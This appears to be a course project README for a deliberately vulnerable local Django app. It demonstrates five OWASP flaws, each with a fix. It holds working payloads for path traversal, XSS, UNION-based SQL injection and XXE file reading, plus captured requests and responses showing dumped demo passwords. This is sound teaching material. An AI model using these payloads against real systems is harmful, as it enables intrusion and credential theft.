LINK: https://github.com/raccna/csb-2021/tree/main/project1/mysite

### Installation

- Install Python
- Optional: Tool for making HTTP requests (eg. Curl, Burp Suite)

Initialize application

```
  ./init.sh
```

Run server

```
  ./run.sh
```

Open browser [http://127.0.0.1:8000/myapp](http://127.0.0.1:8000/myapp)

### Users in database

| Username     | Password    | Role  |
| ------------ | ----------- | ----- |
| john@doe.com | JohnsSecret | Admin |
| jane@doe.com | JanesSecret | User  |
| jim@doe.com  | JimsSecret  | User  |
| jenn@doe.com | JennsSecret | User  |

## FLAW 1: [Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)

### Source code

Flaw can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L21)

### Description

Improper implementation of file reading allows attacker to gain access to any file on the server. In the example attacker receives .htpasswd file contents from the application root.

### Exploitation

Request:

```
GET /myapp/flaw-1?file=../.htpasswd HTTP/1.1
Host: 127.0.0.1:8000
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8000/myapp/flaw-1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Response:

```
HTTP/1.1 200 OK
Date: Sun, 14 Mar 2021 12:30:56 GMT
Server: WSGIServer/0.2 CPython/3.9.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 311
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin

<a href="/myapp">Back</a>
<div>
  This demonstrates path traversal vulnerability. Files are stored in
  <i>/files</i>-directory.
</div>

<ul>
  <li><a href="?file=1.txt">1.txt</a></li>
  <li><a href="?file=../.htpasswd">.htpasswd</a></li>
</ul>

<h3>File contents</h3>
<pre>
admin:password
user:password
</pre>

```

### Fix

By preventing path traversal attacks by not allowing the user to access files outside the safe directory.

Fix can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L32)

## FLAW 2: [Cross-Site Scripting (XSS)](<https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)>)

### Source code

Flaw can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/templates/flaw2.html#L17)

### Description

Improper implementation of form input rendering allows attacker to perform Cross Site Scripting in the page viewer's browser. In the example attacker triggers a Javscript alert-dialog in the browser.

In this case the script is run in the form submitter's browser. In case the comment is persisted in a database and displayed everytime any user browses to this page, it will trigger.

### Exploitation

Navigate to form [http://127.0.0.1:8000/myapp/flaw-2](http://127.0.0.1:8000/myapp/flaw-2) and submit following payload as the comment.

```
<script>alert('This is XSS in action')</script>
```

### Fix

Escape any input originating from forms. In this case it is easily done by removing from the unsafe `safe` parameter from the rendering function.

Fix can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/templates/fix2.html#L14)

## FLAW 3: [Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)

### Source code

Flaw can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L62)

### Description

Improper implementation of SQL parameter escape allows attacker to run malicious queies on the database. In the example attacker retrieves all users from the database via vulnerable login form.

### Exploitation

Navigate to form [http://127.0.0.1:8000/myapp/flaw-3](http://127.0.0.1:8000/myapp/flaw-3) and submit following payload as username or password.

```
=' UNION SELECT * FROM myapp_User--
```

Request:

```
POST /myapp/flaw-3 HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 182
Cache-Control: max-age=0
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8000/myapp/flaw-3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM
Connection: close

csrfmiddlewaretoken=wVure3Nes96bHkjBYMOKiS6HcLu5UtP1gmoSN2jPK4GXQ5hGcdI1hQWU1j7TzLXl&username=%3D%27+UNION+SELECT+*+FROM+myapp_User--&password=%3D%27+UNION+SELECT+*+FROM+myapp_User--
```

Response:

```
HTTP/1.1 200 OK
Date: Sun, 14 Mar 2021 12:32:35 GMT
Server: WSGIServer/0.2 CPython/3.9.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 1102
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM; expires=Sun, 13 Mar 2022 12:32:35 GMT; Max-Age=31449600; Path=/; SameSite=Lax

<a href="/myapp">Back</a>
<div>
  This demonstrates SQL Injection vulnerability. User form input has not been
  sanitized properly when used in SQL query.
</div>

<form method="POST">
  <input type="hidden" name="csrfmiddlewaretoken" value="7GVVz4A1tWkZF9N3UgqRLdl0XCt2ivwxR7Pm836CLRULOUL88Hk8KbbdMa6QXNER">
  <label for="username">Username</label>
  <input
    type="text"
    name="username"
    value="=' UNION SELECT * FROM myapp_User--"
  />
  <br />
  <label for="username">Password</label>
  <input
    type="password"
    name="password"
    value="=' UNION SELECT * FROM myapp_User--"
  />
  <br />
  <input type="submit" value="Login" />
</form>

<div>
  <code>[(1, &#x27;john@doe.com&#x27;, &#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;JohnsSecret&#x27;, 1), (2, &#x27;jane@doe.com&#x27;, &#x27;Jane&#x27;, &#x27;Doe&#x27;, &#x27;JanesSecret&#x27;, 0), (3, &#x27;jim@doe.com&#x27;, &#x27;Jim&#x27;, &#x27;Doe&#x27;, &#x27;edc42553941306d1dc2b096d1a845abb&#x27;, 0), (4, &#x27;Jenn@doe.com&#x27;, &#x27;Jenn&#x27;, &#x27;Doe&#x27;, &#x27;4f37034b879be91c7068a70c23c07e3b&#x27;, 0)]</code>
</div>


```

### Fix

Escape any input originating from users before applying in queries. In this case it is easily done by utilizing django ORM.

Fix can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L73)

## FLAW 4: [XML External Entities (XXE)](<https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)>)

### Source code

Flaw can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L85)

### Description

Improper implementation/configuration of XML parses allows attacker to utilize the XML external entities feature. In the example attacker retrieves all a file from the server containing usernames and passwords.

### Exploitation

Navigate to form [http://127.0.0.1:8000/myapp/flaw-4](http://127.0.0.1:8000/myapp/flaw-4) and submit following XML payload.

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM ".htpasswd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

Request:

```
POST /myapp/flaw-4 HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 313
Cache-Control: max-age=0
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8000/myapp/flaw-4
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM
Connection: close

csrfmiddlewaretoken=JWfqsl30zc3KMrlGcdYPEJMr65O1Su4Mtn9R1kzBR7DwVcjLqES6DHCEVDrPxMc6&xml=%3C%21DOCTYPE+replace+%5B%3C%21ENTITY+ent+SYSTEM+%22.htpasswd%22%3E+%5D%3E%0D%0A++++%3CuserInfo%3E%0D%0A+++++%3CfirstName%3EJohn%3C%2FfirstName%3E%0D%0A+++++%3ClastName%3E%26ent%3B%3C%2FlastName%3E%0D%0A++++%3C%2FuserInfo%3E
```

Response:

```
HTTP/1.1 200 OK
Date: Sun, 14 Mar 2021 12:33:46 GMT
Server: WSGIServer/0.2 CPython/3.9.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 778
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM; expires=Sun, 13 Mar 2022 12:33:46 GMT; Max-Age=31449600; Path=/; SameSite=Lax

<a href="/myapp">Back</a>
<div>
  This demonstrates XXE vulnerability. User provided XML input has not been
  sanitized properly.
</div>

<form method="POST">
  <input type="hidden" name="csrfmiddlewaretoken" value="ZKaRZPXVZAs2hlggTwAxYtcTorCAzXbuJb4iyOtwhv2Oq6el7XuOXr26dZfoefjO">
  <label for="xml">XML</label>
  <textarea name="xml"><!DOCTYPE replace [<!ENTITY ent SYSTEM ".htpasswd"> ]>
    <userInfo>
     <firstName>John</firstName>
     <lastName>&ent;</lastName>
    </userInfo></textarea>
  <br />
  <input type="submit" value="Submit" />
</form>

<pre>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;userInfo/&gt;&lt;userInfo/&gt;
     &lt;firstName/&gt;John&lt;firstName/&gt;
     &lt;lastName/&gt;admin:password
user:password&lt;lastName/&gt;
    &lt;userInfo/&gt;</pre>
```

### Fix

Disable XXE feature and escape input originating from users. In this case it is easily done by utilizing minidom with default settings (XXE is disabled by default).

Fix can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L99)

## FLAW 5: [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

### Source code

Flaw can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/templates/flaw2.html#L117)

### Description

Exploitation in this scenario is two-folded:

1. Improper implementation of SQL parameter escape allows attacker to run malicious queies on the database. In the example attacker retrieves all users from the database via vulnerable login form.

2. Exposed passwords are in plain-text and hashed with insecure MD5 algorithm

### Exploitation

Navigate to form [http://127.0.0.1:8000/myapp/flaw-5](http://127.0.0.1:8000/myapp/flaw-5) and submit following payload as username or password.

```
=' UNION SELECT * FROM myapp_User--
```

Request:

```
POST /myapp/flaw-5 HTTP/1.1
Host: 127.0.0.1:8000
Content-Length: 182
Cache-Control: max-age=0
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8000/myapp/flaw-5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM
Connection: close

csrfmiddlewaretoken=1TnkZF3wyAWPhPrcNhANxBZ93zfcDNeKLkhLyEz7QvwBqAph1Iu4wzPmS7S0i5m4&username=%3D%27+UNION+SELECT+*+FROM+myapp_User--&password=%3D%27+UNION+SELECT+*+FROM+myapp_User--
```

Response:

```
HTTP/1.1 200 OK
Date: Sun, 14 Mar 2021 12:34:37 GMT
Server: WSGIServer/0.2 CPython/3.9.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 1262
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=zrLfzcEXSsrgxUMCtcDYBc4j4h4dSSOsjSFG8bayan12GFKHHDxfAaUwTPH1xaWM; expires=Sun, 13 Mar 2022 12:34:37 GMT; Max-Age=31449600; Path=/; SameSite=Lax

<a href="/myapp">Back</a>

<div>
  This demonstrates Sensitive Data Exposure vulnerability. Some of the passwords
  in database have not been encrypted properly, which enables the attacker to
  easily decrypt them.
</div>

<form method="POST">
  <input type="hidden" name="csrfmiddlewaretoken" value="9Sscw9uKRD2lolkKmP0yWnh7QbL3gUreTjmD580l9yC7x6iPAgUPVl7kFJoRVczy">
  <label for="username">Username</label>
  <input
    type="text"
    name="username"
    value="=' UNION SELECT * FROM myapp_User--"
  />
  <br />
  <label for="username">Password</label>
  <input
    type="password"
    name="password"
    value="=' UNION SELECT * FROM myapp_User--"
  />
  <br />
  <input type="submit" value="Login" />
</form>

<div>
  <code>[(1, &#x27;john@doe.com&#x27;, &#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;JohnsSecret&#x27;, 1), (2, &#x27;jane@doe.com&#x27;, &#x27;Jane&#x27;, &#x27;Doe&#x27;, &#x27;JanesSecret&#x27;, 0), (3, &#x27;jim@doe.com&#x27;, &#x27;Jim&#x27;, &#x27;Doe&#x27;, &#x27;edc42553941306d1dc2b096d1a845abb&#x27;, 0), (4, &#x27;Jenn@doe.com&#x27;, &#x27;Jenn&#x27;, &#x27;Doe&#x27;, &#x27;4f37034b879be91c7068a70c23c07e3b&#x27;, 0)]</code>
  <a href="https://www.md5online.org/md5-decrypt.html" target="_blank"
    >MD5 decrypt tool</a
  >
</div>
```

### Fix

1. Escape any input originating from users before applying in queries. In this case it is easily done by utilizing django ORM.

Fix can be found [here](https://github.com/raccna/csb-2021/blob/main/project1/mysite/myapp/views.py#L128)

2. Store passwords in database [salted and hashed](https://nitratine.net/blog/post/how-to-hash-passwords-in-python/).
